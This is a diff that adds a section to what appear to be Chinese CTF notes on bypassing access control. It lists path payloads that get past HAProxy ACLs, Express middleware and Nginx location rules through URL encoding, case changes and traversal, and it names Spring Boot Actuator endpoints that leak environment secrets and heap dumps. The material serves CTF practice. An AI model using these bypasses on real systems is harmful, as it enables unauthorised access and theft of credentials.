@@ -88,3 +88,38 @@ curl -H "Upgrade: websocket" -H "Connection: Upgrade" http://target/admin/flag
 - 先 nmap 扫全端口找真实后端
 - 假 flag 提交了浪费次数，先确认再提交
 - 网关绕过 7 种方法逐一试，不要只试一种
+
+## 具体产品路由绕过
+
+### HAProxy ACL 绕过
+```bash
+# HAProxy ACL 用正则匹配路径,URL 编码可绕过:
+# 规则: acl block path_beg /admin
+/admin → 403
+/%61dmin → 200 (URL编码 'a')
+/Admin → 200 (大小写,如果 ACL 没 -i)
+```
+
+### Express.js 中间件绕过
+```bash
+# Express 路由匹配在中间件之前做 URL decode:
+# 中间件 app.use('/admin', authCheck) 对 /admin 生效
+# 但 /%2Fadmin 或 /./admin 可能绕过匹配
+/%2fadmin → 绕过中间件(已 decode 的路径不匹配原始挂载)
+```
+
+### Nginx location 绕过
+```bash
+# location /admin { deny all; }
+# 绕过:
+/admin../otherpath  (路径穿越后的相对路径不匹配 location)
+/Admin (大小写, Linux 文件系统敏感但 location 可能不敏感)
+```
+
+### Spring Boot Actuator 未鉴权
+```bash
+# 很多题把 Actuator 暴露了但没设鉴权:
+/actuator/env → 环境变量(含密码/key)
+/actuator/heapdump → JVM 内存(含 session/密码)
+/actuator/configprops → 配置属性
+```
